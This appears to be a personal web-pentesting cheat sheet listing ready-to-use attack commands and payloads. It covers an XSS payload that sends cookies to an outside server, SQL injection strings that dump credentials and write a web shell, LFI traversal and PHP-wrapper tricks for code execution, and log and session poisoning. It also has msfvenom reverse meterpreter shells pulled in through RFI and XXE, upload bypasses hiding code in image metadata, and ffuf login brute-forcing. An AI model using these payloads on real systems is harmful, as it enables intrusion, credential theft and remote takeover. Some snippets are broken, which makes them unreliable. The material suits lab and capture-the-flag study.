



# Finding Subdomains

#### Using Assetfinder

1. Below command will return all the subdomains and other assets domain belonging to target domain 

> assetfinder domain.name > domains.txt

2. Below command will return subdomains only

> assetfinder --subs-only domain.name > subdomains.txt







### Get Valid domain name 

If we are approaching a system and dont know its domain name ,we can try to retreive it from server itself

First  use a valid header to see the response

> curl -H 'Host: IP' "http://IP/'"

Now use invalid host to see if server gives us an error

> curl -H 'Host: http://IP' "http://IP/'"


# CMS

## Wordpress

if we see a wordpress site then use wpscan to find any vulnerbale plugins or enumurate users or bruteforce

**Basic usage**

> wpscan --url=ip

**USer enumuration on wordpress**

> wpscan --url=ip --enumerate u

**Wordpress login bruteforce**

we can also specify usernames list or comma seperated usernames

> wpscan --url=ip --usernames=username  --passwords=wordlist.txt


-  if we managed to login than go to appearnce ,edit theme and paste a php shellcode in 404.php or any other template file

- Then we can trigger our code by goint to that template file in following path

>  `http://url/wp-content/themes/themename/file.php`
 
 - if themes cannot  be edited we can tr to edit plugins
 - Then trigger with this path
 > `http:/url/wp-content/plugins/editedfile.php`
 
 
## Joomla

If JOomla is being used then try using joomscan

- If you cant find version for joomla try finding manually

> https://IP/administrator/manifests/files/joomla.xml


If we are logged in and want to get a reverse shell 

1.  Go to templates then choose any template from list
2. NOw edit index.php and paste your reverse shell there and save the file
3. Now click preview template and our shell gets executed
                 Or
4. click newfile ,give it any name and paste your code 
5. Now to execute it go to http://IP/adminstrator/templates/TEMPLATENAME/filename.php
                 











# XSS
    
    ### Stealing cookies      
  
       **Insert this payload in vulnerable app**     

   >   <script>var i=new image();i.src="http://oursite.com/receiverfiletowritecookies.php?parameter="+escape(document.cookie)</script> 
 
        **receiving php file on which cookies will be written**
 
   >     <?php
   >      
   >    $ip=$_SERVER['REMOTE_ADDR'];$browser=$_SERVER['HTTP_USER_AGENT'];
   >    
   >   
   >    $fp=fopen('txtstorefileonourserver.txt','a');
   >    
   >   fwrite($fp,$ip.''.$browser." \n");fwrite($fp,urldecode($_SERVER['QUERY_STRING']. " \n\n"));fclose($ip);?>

- ## SQLI
 
   -   **injecting a single quote can cause weird behavior of app indicating possible injection point**
   -   **Try all get(through url),post(burp) parameters and inject in headers also(burp)**
   -   **when testing boolean sqli,a true condition shows as normal while false causes app to malfunction**
   -   ****
      
     ### basic boolean sqli

       web app uses select example,example2 from table_name where id=somevalue . We add our payload to make it a boolean condition

       This query dump all the information which is queried and we only check comdition with the parameter to make statement true

>     ' or 1=1--        

- **if basic or statemnet doesnt work try substituing or with it symbol || and try # for cemmnting instead of --**

>    ' || 1=1#

     
     ### basic union sqli

       Union based sqli doesnt ignore the app sql query as there is no boolean condition so application query is executed alongside our crafted query

      Union joins different sql queries together

      **We dont know that how many attributes is the application asking in the query which we manipulate**
      
      **to tackle that we can use following payload**
      ***'union select null,null;***   we can keep increasing amount of nulls in our query and at which number web app dont give any error,thats the right amount of queries
      **We can also do this by using ORDER By 1,order by 2(keep increasing orders until you get right amount of queiries)**

>     ' union select username,password from table_name where 1=1;

     #### local database username

>      we can see the database user using user() function ; 
>      Query is   ' union select user();-- -   

   -   admin' or '1'='1 	     *Basic Auth Bypass*
   
   -   admin')-- - 	     *Basic Auth Bypass With comments*

   -   ' order by 1-- - 	*Detect number of columns using order by*

   -   cn' UNION select 1,2,3-- - 	*Detect number of columns using Union injection*

   -   cn' UNION select 1,@@version,3,4-- - 	*Basic Union injection*

   -   UNION select username, 2, 3, 4 from passwords-- - 	*Union injection for 4 columns*

   -  SELECT @@version 	    *Fingerprint MySQL with query output*

   -  SELECT SLEEP(5)  	         *Fingerprint MySQL with no output*

   -  cn' UNION select 1,database(),2,3-- - 	     *Current database name*

   -  cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - 	*List all databases*

   -  cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - 	*List all tables in a specific database*

   - cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - 	*List all columns in a specific table*

   - cn' UNION select 1, username, password, 4 from dev.credentials-- - 	*Dump data from a table in another database*

   -  cn' UNION SELECT 1, user(), 3, 4-- - 	*Find current user*

   -  cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- - 	*Find if user has admin privileges*

   -  cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- - 	*Find if all user privileges*

   - cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- - 	*Find which directories can be accessed through MySQL*
 
   -  cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- - 	*Read local file*

   - select 'file written successfully!' into outfile '/var/www/html/proof.txt' 	*Write a string to a local file*

   - cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- - 	*Write a web shell into the base web directory*



- ## LFI

https://book.hacktricks.xyz/pentesting-web/file-inclusion
 
https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225

LFI occurs when a parameter fetch a resource from server and we can instead make it fetch our requried files.

> **Sometimes server includes a filname or directory in the get parameter so we can bypass it by pre appending a / and then traverse to required file as sometimes server requires it**

NOtice how we preappended a / with etcpasswd location

> http://example.com/?id=/../../../../../etc/passwd

If server requires a specific keyword then we can add it first and then traverse to required location

#### Bypassing Blackilisting

1. Sometimes server removes the ../ from our request and we cannot traverse direcotriees. To overcome this, we can simply
either use .././ or ....// instead of a single ../. ,To demonstrate

**?param=../../../../../etc/passwd** would become

> **?param=....//....//....//....//....//etc/passwd**
           
             OR
          
> ..//..//..//..//..//..//etc/passwd

2. We can also bypass string blacklisting by rul encodeing .This works in php 5.3.4< .  

a ../ url encoded is %2e%2e%2f

so our previous double slash bypass can be encoded as

> %2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd


3. We can also make use of null byte which is %00. php versions 5.5< \ is vulnerable to this and we can use it to 
like bypass the append .php extension or few different things.

#### PHP WRAPPERS

Sometimes server preappends .php extension with resources being fetched by server ,so we can make use of  php filter
wrapper which sends required eqest as base64 and recieves it in base64 .if we have to get source of index.php  we
can get it by using this filter  and giving the resource parameter as index. Index source can give us more info about structure
of blacklisting and server and then we can further craft our payloads as we desire

- when normal lfi doesnt return output,then we can use this and we will get our output in base64.

> http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index


 php://filter/read=convert.base64-encode/resource=/etc/passwd 	PHP filter to convert file contents to Base64

php://filter/read=string.rot13/resource=/etc/passwd 	PHP filter to convert file contents to ROT13


- expect://id 	Command execution with PHP Expect wrapper

we can directly use expect wrapper to execute commands

> http:/example.com/index.php?param=expect://id


- We can also try data wrapper which allows us to include our own code from external source

we have to encode the code we want to execute on server side in base64. In following example we encoded php web get shell in base64

Allow_url_include must be enabled

> http://blog.inlanefreight.com/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id

- php://input
input wrapper is also like data wrapper and we can include this in lfi parameter 

we input our php get shell in body area of the request as its the data we are sending to server and we use
?param=php://include&cmd=ls in our  request

we can do it with curl

> curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input"
 

- php zip://

we can use this to interact a zip file on server

If we can upload zip files then we a upload a zip including our php get web shell and
1. echo "<?php system($_GET['cmd']; ?>)" > exec.php
2. zip malicious.zip exec.php
 
we upload the malicious.zip on website 

zip wrapper allows to include the files inside a zip file and thus we can interact with exec.php and add a cmd parameter executing our commands

http://example.com/index.php?language=zip://malicious.zip%23exec.php&cmd=id   

files inside a zip are referenced with a # sign but we have to url encode it in our request  which is %23

#### Web  log poisining (APache or nginx)
 
  https://www.hackingarticles.in/apache-log-poisoning-through-lfi/
  https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2

- In this attack we try to access the apache logs through lfi and then pass a web shell in user agent header in request
which can give us rce

- Possible injection locations

1. /var/log/apache2/access.log
2. /var/log/apache/access.log
3. /var/log/apache2/error.log
4. /var/log/apache/error.log
5. /usr/local/apache/log/error_log
6. /usr/local/apache2/log/error_log
7. /var/log/nginx/access.log
8. /var/log/nginx/error.log
9. /var/log/httpd/error_log
10. /var/log/nginx/access.log
11. /var/log/sshd.log
12. /var/log/mail  
13. /var/log/vsftpd.log.

Use this command in useragent header

whenever sending payloads in request parameters and if it fails, try url encoding it if that fails try double url encoding


> <?php system($_GET['cmd']); ?>

NOw we will add the cmd paramter in url and execute commands as follows

http://example.com/product?view=../../../../../var/log/apache2/access.log&cmd=id

#### Self environ LFI TO RCE

we can navigate to /proc/self/environ and pass php shell in user agent header just like log poisoning

if we can access apache logs then we can get a rce via user agent header.

1. get the lfi apache logs and use burp to intercept

2. Now add a php parameter shell   <?php system($_GET['c']); ?> to user agent header and forward it

3. 	NOw access that parameter and execute commands as www-data


#### PHPSESSID cookie RCE FROM LFI

> If our web app has phpsessid cookie and we have found a lfi point ,we can try cookie poisoining

when we include our malicius file or payload in lfi point ,the cookie stores in the below mentioned path. WE can verify by typing
any random string in lfi parameter and then view the contents of session cookie by including /var/lib/php/sessions/sess_COOKIEVALUE in lfi
if our random string is there then we can pollute the cookie. We can pollute the lfi parameter with <?php system($_GET['cmd']); ?>
Now simply include the cookie file path /var/lib/php/sessions/sess_COOKIEID&cmd=ourcommands.
we can execute commands at system level now. The php get shell must always be included whenever executing a command becuase cookie value keeps getting changed

we have to pollute the cookie evrytime after executing  a ingle command becuse it overwrites it

The payload will be 

> ?param=<?php system($_GET['cmd']); ?>

Now execute the command

> ?param=../../../../../var/lib/php/sessions/sess_COOKIEID&cmd=id


Similar to server log files, PHP saves user sessions on disk. This path is dictated by the session.save_path configuration variable, which is empty by default.

in linux php sessions are stored in /var/lib/php/sessions/ and in windows c:\windows\temp

The name of the session file can be identified from the PHPSESSID cookie. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3 then it's location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.




### RFI

#### http rfi

1. Use the following shell in rfi and host a server in the directory

we use .txt format because sometimes server executes php on our machine isntead of victim

> msfvenom -p php/meterpreter/reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f raw > shell.txt

2. Now go to the url and include your webserver and file alongside it

> http://site.com?example.php=http://10.4.30.255:80/shell.txt

3. Listen on msf handler with the php/meterpreter/reverse_tcp set

we can also include a normal shell instead of a msf exploit

#### ftp rfi

1. start a ftp server where you shell is

python3 -m pyftpdlib -p21

2. in injection point include

>  ?param=ftp://ipaddress/shell.php&cmdid

#### smb rfi

1. start a impacket smb server and if target is windows this is helpful

2. we can directly include it as an smb share

?param=\\ipaddress\sharename\shell.php&cmd=id

## XXE

we canot use whitespaces in this attack so either we can use the $IFS command instead of a space

#### THis is used to read local files on server

<!- - ?xml version="1.0" ?- ->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<userinfo>
<user>
&ent;
</user>
</useinfo>

WE can also use the above command and replace file with expect command

### REmote xxe


we can use this to upload a shell to server

instead of .php shell we should make .txt shell with msfvenom because these attacks sometimes run the php shell 
on our machine

> msfvenom -p php/meterpreter/reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f raw > shell.txt

<!- - ?xml version="1.0" ?- ->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "expect://curl$IFS'10.4.30.255:80/shell.php'"> ]>
<userinfo>
<user>
&ent;
</user>
</useinfo>



## FIle uploads attacks

try different extensions like .pHp,.php5,.phtml etc 
there are diffferent extensions for single technology

mime-type shows us content type inside a file regardless of its extension,we can change this and trick the server

we can check a file content type by following

> file --mime-type filname.extension

sometimes try changing the content type in burp because servers verify sometimes from there

for example we can change the application/x-php to image/jpeg if server accepts images etc

#### Hidiing malcious code in an image

We can upload malicious code in legit image by inserting our payload in exifdata. Exif comment is best place to write to

>  exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-USERNAME.jpeg.php

We can use above example to test if our payload gets execueted or not.PHP code is not a must and we can write any payload here according to the webapp we are attacking. In real cases we need to obfuscate our code and then add that obfuscated malicous payload in exifdata to avoid detection


# Fuzzing

## ffuf

We can use flag -fs to specify the size of requests in majority.First use ffuf without this and then stop and again perfrom the scan and this time specify the common return size in this flag as this will rule out the common errors returns. We can use same logic with -fw.


If we have to use more than one wordlists,we specify it as follows -w wordlist1.txt:W1,wordlist2.txt:w2 and then instead of FUZZ keyword we use w1 and w2

#### To fuzz valid usernames in a POST login form

> ffuf -w wordlist.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://IP/login -mr "Whatever the error form throws"


####To bruteforce webbased passwords

> ffuf -u http://MACHINE_IP/sqli-labs/Less-11/ -c -w /usr/share/seclists/Passwords/Leaked-Databases/hak5.txt -X POST -d 'uname=Dummy&passwd=FUZZ&submit=Submit' -fs 1435 -H 'Content-Type: application/x-www-form-urlencoded' 

username/password fuzzing

> ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200

        

####Subdomains and vhosts fuzzing

> ffuf -u http://FUZZ.mydomain.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

####private subdomains

> ffuf -u http://FUZZ.mydomain.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0


####vhost
>  ffuf -u http://mydomain.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.mydomain.com' -fs 0


We can also fuzz over a proxy

> ffuf -u http://MACHINE_IP/ -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -x http://127.0.0.1:8080


# Cookie poisoning

We can make a curl request to target and set cookie attributes true in a manual header.

> curl -H "Cookie: logged_in=true; admin=true" http://10.10.26.188/cookie-test

If we  decode a base64 cookie and it has some attributes set to false like admin-false,we can copy the same format making admin true then base64 encode it and place it in our browser and refresh to see if it works

> 
